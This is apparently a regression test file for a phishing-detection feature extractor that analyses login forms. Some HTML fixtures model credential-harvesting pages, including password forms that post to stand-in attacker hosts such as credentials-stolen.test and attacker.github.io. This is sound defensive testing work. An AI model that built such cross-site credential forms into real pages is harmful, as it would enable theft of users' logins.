const assert = require('node:assert/strict');
const extract = require('./extract-fixture.cjs');

const legitimate = extract(
  '<form action="/session" method="post"><input type="email"><input type="password"></form>',
  'https://business.amazon.com/login'
);
assert.equal(legitimate.has_password_input, 1);
assert.equal(legitimate.credential_field_count, 2, 'type=email counts even without name');
assert.equal(legitimate.cross_domain_form_action, 0);
assert.equal(legitimate.credential_submission_script, 0);
assert.equal(legitimate.credential_form_method_get, 0);
assert.equal(legitimate.credential_form_explicit_get, 0);

const subdomain = extract(
  '<form action="https://auth.example.com/session" method="post"><input type="password"></form>',
  'https://www.example.com/login'
);
assert.equal(subdomain.cross_domain_form_action, 0, 'same registrable site auth subdomains are ordinary');

const validation = extract(
  '<input name="password"><script>document.addEventListener("input", send); fetch("/collect")</script>',
  'https://college.example/login'
);
assert.equal(validation.form_count, 0);
assert.equal(validation.has_password_input, 1);
assert.equal(validation.credential_submission_script, 0, 'input listeners and fetch do not establish credential theft');
assert.equal(validation.credential_script_activity, 1);

const fields = extract(
  '<input name="company"><input type="email"><input name="userPassword"><input autocomplete="one-time-code">',
  'https://college.example/login'
);
assert.equal(fields.credential_field_count, 3, 'company must not match PAN; camelCase and autocomplete do match');
const inactive = extract(
  '<input type="hidden" name="password"><input disabled type="password"><div hidden><input type="password"></div>' +
  '<div style="display:none"><input type="password"></div><fieldset disabled><input type="password"></fieldset>' +
  '<input name="pan" style="visibility:hidden"><input name="otp" style="opacity:0">',
  'https://college.example/login'
);
assert.equal(inactive.has_password_input, 0);
assert.equal(inactive.credential_field_count, 0);
assert.equal(inactive.credential_context, 0);
const restoredVisibility = extract('<div style="visibility:hidden"><input type="password" style="visibility:visible"></div>', 'https://college.example/');
assert.equal(restoredVisibility.has_password_input, 1, 'a descendant can restore inherited CSS visibility');
const camelCase = extract('<input name="userName"><input name="cardNumber"><input name="creditCardNumber">', 'https://college.example/login');
assert.equal(camelCase.credential_field_count, 3);
assert.equal(camelCase.sensitive_credential_field_count, 2);
const numberedFields = extract('<input name="password1"><input name="otp6"><input name="company123">', 'https://college.example/');
assert.equal(numberedFields.has_password_input, 1, 'numeric suffixes do not hide password metadata');
assert.equal(numberedFields.sensitive_credential_field_count, 2);
const accessibleFields = extract('<form method="post" action="https://destination.example.org/collect">' +
  '<label for="field-a">Password</label><input id="field-a">' +
  '<label>Email <input></label><input aria-label="One-time code">' +
  '<span id="recovery-label">Recovery phrase</span><textarea aria-labelledby="recovery-label"></textarea>' +
  '<input placeholder="Credit card number"></form>', 'https://college.example/login');
assert.equal(accessibleFields.has_password_input, 1, 'associated labels identify text-type password prompts');
assert.equal(accessibleFields.credential_field_count, 5, 'accessible names supplement arbitrary field IDs');
assert.equal(accessibleFields.sensitive_credential_field_count, 4);
assert.equal(accessibleFields.cross_domain_form_action, 1);
const metadataNoise = extract('<form method="post" action="https://search.example.org/">' +
  '<input type="search" placeholder="Search password help"><input placeholder="Card games">' +
  '<input placeholder="Wallet address"><input placeholder="Seed variety"><input placeholder="Pan size">' +
  '<label><textarea>password</textarea><input id="ordinary"></label></form>', 'https://college.example/');
assert.equal(metadataNoise.credential_field_count, 0, 'generic prose and textarea default values are not credential labels');
const inheritedEditor = extract('<div contenteditable="true"><span id="user-text">Password</span></div>' +
  '<form method="post"><input aria-labelledby="user-text"></form>', 'https://college.example/');
assert.equal(inheritedEditor.credential_field_count, 0, 'referenced labels inside an editor never contribute user text');
const shadowLogin = extract('<span id="prompt">Ordinary label</span><div id="component"></div>', 'https://college.example/', (window) => {
  const root = window.document.getElementById('component').attachShadow({ mode: 'open' });
  root.innerHTML = '<span id="prompt">Password</span><form method="post" action="https://destination.example.org/collect">' +
    '<input aria-labelledby="prompt"></form><div id="nested"></div>';
  root.getElementById('nested').attachShadow({ mode: 'open' }).innerHTML = '<input autocomplete="one-time-code">';
});
assert.equal(shadowLogin.has_password_input, 1, 'root-scoped ARIA references resolve inside open shadow trees');
assert.equal(shadowLogin.form_count, 1);
assert.equal(shadowLogin.credential_field_count, 2, 'nested open components are inspected');
assert.equal(shadowLogin.cross_domain_form_action, 1);
const shadowHidden = extract('<div id="component" style="display:none"></div>', 'https://college.example/', (window) => {
  window.document.getElementById('component').attachShadow({ mode: 'open' }).innerHTML = '<form><input type="password"></form>';
});
assert.equal(shadowHidden.credential_field_count, 0, 'a hidden shadow host hides its credential fields');
const undistributed = extract('<div id="component"><input type="password"></div>', 'https://college.example/', (window) => {
  window.document.getElementById('component').attachShadow({ mode: 'open' }).innerHTML = '<p>Visible component</p>';
});
assert.equal(undistributed.credential_field_count, 0, 'unassigned light-DOM controls are not rendered');
const slottedHidden = extract('<div id="component"><input type="password"></div>', 'https://college.example/', (window) => {
  window.document.getElementById('component').attachShadow({ mode: 'open' }).innerHTML = '<div inert><slot></slot></div>';
});
assert.equal(slottedHidden.credential_field_count, 0, 'inert slot ancestry applies to distributed controls');
const scriptData = extract('<input type="password"><script type="application/json">{"activity":"fetch submit"}</script>', 'https://college.example/');
assert.equal(scriptData.credential_script_activity, 0, 'JSON script data cannot establish executable submission activity');
const phrase = extract('<form action="/session" method="post"><textarea name="recoveryPhrase"></textarea></form>', 'https://college.example/');
assert.equal(phrase.sensitive_credential_field_count, 1, 'wallet recovery textareas are sensitive without reading their values');

const external = extract(
  '<p>credentials-stolen.test</p><form action="https://credentials-stolen.test/collect" method="post"><input type="password"></form>',
  'https://phish.example/login'
);
assert.equal(external.cross_domain_form_action, 1, 'page-controlled text cannot establish destination trust');
assert.equal(external.credential_form_cross_site, 1);
const privateTenants = extract(
  '<form action="https://attacker.github.io/collect" method="post"><input type="password"></form>',
  'https://victim.github.io/login'
);
assert.equal(privateTenants.cross_domain_form_action, 1, 'private suffix tenants are separate sites');

const unrelated = extract(
  '<title>Account Login</title><form action="/session" method="post"><input type="password"></form>' +
  '<form action="https://newsletter.example.org/join"><input type="email"></form>' +
  '<form action="https://search.example.org"><input name="q"></form>',
  'https://college.example/login'
);
assert.equal(unrelated.cross_domain_form_action, 0, 'unrelated newsletter/search targets do not contaminate credential forms');
const emailOnly = extract('<title>Sign in</title><form action="https://auth.example.org/login"><input type="email"></form>', 'https://college.example/');
assert.equal(emailOnly.credential_field_count, 1);
assert.equal(emailOnly.credential_context, 1);
assert.equal(emailOnly.identity_only_form, 1);
assert.equal(emailOnly.cross_domain_form_action, 1);
const newsletter = extract('<form action="https://newsletter.example.org/join"><input type="email"></form>', 'https://college.example/');
assert.equal(newsletter.credential_context, 0);
assert.equal(newsletter.cross_domain_form_action, 0);

const associated = extract(
  '<form id="auth" action="/session" method="post"></form><input type="password" form="auth">' +
  '<button form="auth" formaction="https://destination.example.org/collect">Continue</button>',
  'https://college.example/login'
);
assert.equal(associated.password_form_count, 1);
assert.equal(associated.cross_domain_form_action, 1, 'external form association and submitter overrides must be inspected');
const base = extract(
  '<base href="https://destination.example.org/path/"><form action="collect" method="post"><input type="password"></form>',
  'https://college.example/login'
);
assert.equal(base.cross_domain_form_action, 1, 'relative actions resolve against HTML base');
const emptyBase = extract(
  '<base href="https://destination.example.org/"><form method="post"><input type="password"></form>',
  'https://college.example/login'
);
assert.equal(emptyBase.cross_domain_form_action, 0, 'empty actions use the current document URL despite base');
assert.equal(emptyBase.form_action_is_empty, 1);
const downgrade = extract('<form action="http://college.example/session" method="post"><input type="password"></form>', 'https://college.example/login');
assert.equal(downgrade.credential_transport_downgrade, 1);
assert.equal(downgrade.credential_insecure_transport, 1);
assert.equal(downgrade.cross_domain_form_action, 0, 'scheme changes have a distinct transport signal');
const http = extract('<form method="post"><input type="password"></form>', 'http://college.example/login');
assert.equal(http.credential_insecure_transport, 1);
assert.equal(http.credential_transport_downgrade, 0);
const targetIp = extract('<form action="https://192.0.2.4/session"><input type="password"></form>', 'https://college.example/login');
assert.equal(targetIp.credential_target_ip, 1);
assert.equal(targetIp.credential_form_method_get, 1);
assert.equal(targetIp.credential_form_explicit_get, 0, 'a missing method is a weak native fallback, not an observed network submission');
const methodOverride = extract('<form method="post"><input type="password"><button formmethod="get">Continue</button></form>', 'https://college.example/login');
assert.equal(methodOverride.credential_form_method_get, 1);
assert.equal(methodOverride.credential_form_explicit_get, 1);
const disabledSubmitter = extract('<form method="post"><input type="password"><fieldset disabled><button formaction="https://destination.example.org/collect">Continue</button></fieldset></form>', 'https://college.example/login');
assert.equal(disabledSubmitter.cross_domain_form_action, 0);
const customPort = extract('<form action="https://college.example:8443/session" method="post"><input type="password"></form>', 'https://college.example/login');
assert.equal(customPort.cross_domain_form_action, 0);
assert.equal(customPort.credential_form_cross_origin, 1);
assert.equal(customPort.credential_target_unusual_port, 1);
const invalid = extract('<form action="javascript:void(0)" method="post"><input type="password"></form>', 'https://college.example/login');
assert.equal(invalid.invalid_credential_action, 0);
assert.equal(invalid.credential_script_action, 1);
assert.equal(invalid.credential_form_explicit_get, 0);
assert.equal(invalid.credential_submission_script, 0);
const jsDefault = extract('<form action="javascript:void(0)"><input type="password"></form>', 'https://college.example/login');
assert.equal(jsDefault.credential_form_method_get, 1, 'effective fallback remains diagnostic metadata');
assert.equal(jsDefault.credential_form_explicit_get, 0);
assert.equal(jsDefault.credential_script_action, 1);
const getForm = extract('<form method="get"><input type="password"></form>', 'https://college.example/login');
assert.equal(getForm.credential_form_explicit_get, 1);
const invalidMethod = extract('<form method="patch"><input type="password"></form>', 'https://college.example/login');
assert.equal(invalidMethod.credential_form_explicit_get, 1, 'an invalid declared method uses the native GET fallback');
const blankMethod = extract('<form method=" "><input type="password"></form>', 'https://college.example/login');
assert.equal(blankMethod.credential_form_method_get, 1);
assert.equal(blankMethod.credential_form_explicit_get, 0);
const paddedMethod = extract('<form method=" post "><input type="password"></form>', 'https://college.example/login');
assert.equal(paddedMethod.credential_form_method_get, 1, 'whitespace-padded enumerated method values are invalid and the native browser uses GET');
assert.equal(paddedMethod.credential_form_explicit_get, 1);
const dialog = extract('<form method="dialog"><input type="password"></form>', 'https://college.example/login');
assert.equal(dialog.credential_form_method_get, 0);
assert.equal(dialog.invalid_credential_action, 0);
assert.equal(dialog.credential_contexts.length, 1, 'dialog forms retain sensitive context without a network submission target');
assert.equal(dialog.credential_contexts[0].has_password_input, 1);
assert.equal(dialog.credential_contexts[0].cross_domain_form_action, 0);
assert.equal(dialog.credential_contexts[0].credential_script_action, 0);
const separateFlows = extract(
  '<form method="post" action="https://id.example.org/authorize"><input type="email" autocomplete="username"></form>' +
  '<form method="get" action="/lookup"><input type="password" name="password"></form>',
  'https://college.example/login'
);
assert.equal(separateFlows.credential_contexts.length, 2);
assert.equal(separateFlows.credential_contexts[0].has_password_input, 0);
assert.equal(separateFlows.credential_contexts[0].sensitive_credential_field_count, 0);
assert.equal(separateFlows.credential_contexts[0].cross_domain_form_action, 1);
assert.equal(separateFlows.credential_contexts[0].credential_form_method_get, 0);
assert.equal(separateFlows.credential_contexts[1].has_password_input, 1);
assert.equal(separateFlows.credential_contexts[1].cross_domain_form_action, 0);
assert.equal(separateFlows.credential_contexts[1].credential_form_method_get, 1);
const alternativeFlows = extract(
  '<form method="post" action="https://id.example.org/authorize"><input type="password" name="password">' +
  '<button formaction="/lookup" formmethod="get">Local fallback</button></form>',
  'https://college.example/login'
);
assert.equal(alternativeFlows.credential_contexts.length, 2);
assert.equal(alternativeFlows.credential_contexts[0].cross_domain_form_action, 1);
assert.equal(alternativeFlows.credential_contexts[0].credential_form_method_get, 0);
assert.equal(alternativeFlows.credential_contexts[1].cross_domain_form_action, 0);
assert.equal(alternativeFlows.credential_contexts[1].credential_form_method_get, 1);
const orphan = extract('<input type="password">', 'https://college.example/login');
assert.equal(orphan.credential_contexts.length, 1);
assert.equal(orphan.credential_contexts[0].has_password_input, 1);
assert.equal(orphan.credential_contexts[0].credential_form_method_get, 0);
assert.equal(orphan.credential_contexts[0].credential_form_explicit_get, 0);
assert.equal(orphan.credential_contexts[0].credential_script_action, 0);
assert.equal(orphan.credential_contexts[0].cross_domain_form_action, 0);

console.log('Form feature extraction regression tests passed.');
